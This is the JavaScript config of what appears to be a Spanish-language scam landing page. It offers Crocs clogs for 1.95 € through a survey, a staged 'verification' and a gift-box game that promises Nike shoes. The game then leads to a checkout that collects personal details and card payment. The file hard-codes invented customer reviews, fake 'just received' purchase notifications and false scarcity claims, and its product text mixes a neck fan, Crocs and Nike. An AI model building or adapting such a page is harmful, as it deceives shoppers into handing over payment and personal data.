const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href;
const baseHref = window.location.protocol + '//' + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "es";
  const lang = "es-ES";
  const locale = lang;

  const sizes = {
    enabled: true,
    selectText: "TALLA: ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ]
  };

  const bottomRow = {
    bar: "menú",
    account: "Acceder",
    heart: "Lista de deseos",
    bag: "Carrito",
    find: "Buscar"
  };

  const mainProduct = {
    header: "Oferta limitada",
    name: "Ventilador de cuello",
    oldPrice: "29,99 €",
    newPrice: "1,95 €",
    selectText: "COLOR: ",
    text: `Aprovecha un ajuste personalizado, resistente al agua y con ventilación para una mejor transpirabilidad. Los Crocs Classic
          son los zapatos perfectos para todas las ocasiones. Completamente moldeados en material Croslite™.
<br></br>
          Increíblemente ligeros y súper divertidos de usar.
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Roma, Italia",
      action: "¡Acabo de recibir los Clogs por 1,95 euros!",
      timeago: "Hace 15 segundos",
    },
    {
      user: "Carlos B******",
      location: "Milán, Italia",
      action: "¡Acabo de recibir los Clogs por 1,95 euros!",
      timeago: "Hace 25 segundos",
    },
  ];

  const reviewsArr = [
    {
      name: "Mateo",
      time: "Hace 1 día",
      header: "¡Es increíble!",
      product: "26468781",
      review: "“¡Adoro mis Crocs Classic Clogs! Son increíblemente cómodos y perfectos para caminar y hacer jardinería. Ligeros y fáciles de limpiar 😊",
      image: "./index_files/review1.jpg",
    },
    {
      name: "Lucas",
      time: "Hace 2 días",
      header: "¡Fantástico! No tengo palabras.",
      product: "26468783",
      review: "Compré los Crocs para la playa, pero ahora los uso todos los días. Cómodos, no irritan y los pies no sudan. Excelente elección",
      image: "./index_files/review2.jpg",
    },
    {
      name: "Valentina",
      time: "Hace 2 días",
      header: "Simplemente fantástico.",
      product: "26468782",
      review: "A mi hija le encantan los Crocs con los Jibbitz coloridos. No solo son bonitos, sino también cómodos. Aptos para la escuela y las excursiones.",
      image: "./index_files/review3.jpg",
    },
    {
      name: "Santiago",
      time: "Hace 4 días",
      header: "Me gusta",
      product: "26468782",
      review: "Al principio era escéptico, pero después del primer uso entendí por qué a todos les gustan tanto. Increíblemente cómodos y ligeros. ¡Buena compra!",
      image: "./index_files/review4.jpg",
    },
    {
      name: "Martina",
      time: "Hace 7 días",
      header: "¡Wow, me encanta este producto!",
      product: "26468783",
      review: "¡Adoro los Crocs! Son tan suaves y cómodos que puedo usarlos todo el día sin cansarme. Ideales para viajes y largas caminatas. ¡Los recomiendo a todos!",
      image: "./index_files/review5.jpg",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "RESEÑAS Y CRÍTICAS",
    percent: "99%",
    rec: "Comentarios sobre esta promoción",
  };

  const questions = {
    _of: "Pregunta {1} de {2}: ",
    arr: [
      {
        q: "¿Has usado nuestros productos antes?",
        a: [
          "Sí, compro a menudo",
          "Sí, compro raramente",
          "Nunca he comprado",
        ],
      },
      {
        q: "¿Nos recomendarías a tus amigos?",
        a: ["¡Sí, absolutamente!", "Sí, pero cambien el diseño de los crocs.", "No"],
      },
      {
        q: "¿Cuál es el color más popular de Crocs este año?",
        a: ["Negro", "Verde", "Blanco", "Rojo"],
      },
    ],
  };

  const check = {
    title: "Tu respuesta será verificada...",
    arr: [
      "Has respondido la pregunta 3/3.",
      "Tu dirección IP no permite sacar conclusiones sobre pedidos anteriores.",
      "Tu respuesta ha sido verificada.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Felicidades, has confirmado que eres una persona real",
        button: "OK",
        text: `
        <center>
       Hoy, {date}, tienes la oportunidad de comprar un par de zapatillas Nike Air Force 1'07 a un precio especial
          <br><br>
         Todo lo que tienes que hacer es elegir la caja de regalo correcta.
          <br><br>
      ¡Tienes 3 intentos, buena suerte!
        </center>
      `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
        <center>
    Lamentablemente, este regalo está vacío. ¡Aún tienes 2 intentos, buena suerte!
        </center>
      `,
      },
    },
    win: {
      texts: {
        header: "¡Felicidades! ¡Has ganado!",
        button: "OK",
        text: `
        <center>
          <p style="color: #000">
       Has ganado un par de zapatillas "Nike Air Force 1'07"
          </p>
          <br>
            1) Haz clic en "OK" para ir a la página de entrega.
            <br><br>
            2) Rellena el formulario y paga el pedido utilizando tu descuento personal.
            <br><br>
            3) El paquete será entregado en 2-3 días.
        </center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Información personal",
      fields: {
        name: {
          enabled: true,
          field: "Nombre",
        },
        family: {
          enabled: true,
          field: "Apellido",
        },
        phone: {
          enabled: true,
          field: "Número de teléfono",
        },
        email: {
          enabled: true,
          field: "Dirección de correo electrónico",
        },
      },
    },
    delivery: {
      title: "Entrega",
      fields: {
        city: {
          enabled: true,
          field: "Ciudad",
        },
        address: {
          enabled: true,
          field: "Dirección de entrega",
        },
        zip: {
          enabled: true,
          field: "Código postal",
        },
      },
    },
    payment: {
      title: "Métodos de pago",
      creditCard: "Pago en línea con tarjeta de crédito",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Detalles del pedido",
      oldPrice: "89,99 €",
      newPrice: "1,95 €",
      size: "Talla",
      subTotal: {
        title: "Subtotal",
        amount: "1,95 €",
      },
      delivery: {
        title: "Entrega",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "1,95 €",
      },
      checkoutButton: "Paga tu pedido",
    },
  };





  const products = [
    {
      id: "26468781",
      slide: 2,
      name: "Verde",
      miniImg: "./assets/p2.webp",
      images: [
        "./assets/p2.webp"
      ],
    },
    {
      id: "26468782",
      slide: 3,
      name: "Rosa",
      miniImg: "./assets/p3.webp",
      images: [
        "./assets/p3.webp"
      ],
    },
    {
      id: "26468783",
      slide: 4,
      name: "Azul",
      miniImg: "./assets/p4.webp",
      images: [
        "./assets/p4.webp"
      ],
    },
    {
      id: "26468784",
      slide: 5,
      name: "Blanca",
      miniImg: "./assets/p5.webp",
      images: [
        "./assets/p5.webp"
      ],
    },
    {
      id: "26468785",
      slide: 6,
      name: "Púrpura",
      miniImg: "./assets/p6.webp",
      images: [
        "./assets/p6.webp"
      ],
    }
  ];


  const footer = {
    cr: "© 2024, Ubuyee.",
  };

  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    bottomRow
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) => {
  localStorage.setItem("__selected_product", val);
  // console.log(val);
};
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  // console.log(product);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value = `${mainProduct.name}: ${product.name}`;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;
  const selectedSize = sizes.arr?.[lsGetSelectedSizeInd()];
  document.querySelector("input[name='product_size']").value = selectedSize;

  return selectedSize;
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader?.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader?.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};

document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});
